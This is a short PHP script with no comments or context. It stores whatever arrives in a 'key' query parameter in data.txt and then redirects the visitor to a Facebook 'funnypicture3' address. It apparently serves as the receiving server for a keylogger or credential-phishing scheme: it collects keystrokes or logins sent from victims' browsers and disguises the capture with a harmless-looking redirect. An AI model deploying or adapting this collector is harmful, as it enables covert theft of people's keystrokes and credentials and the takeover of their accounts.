<?php
$logfile="data.txt";
$key = $_GET['key'];
if($key !=""){
 $current = file_get_contents($logfile);
  $key .=$current;
  file_put_contents($logfile,$key);
}

header ('Location: http://facebook.com/funnypicture3/');
?>
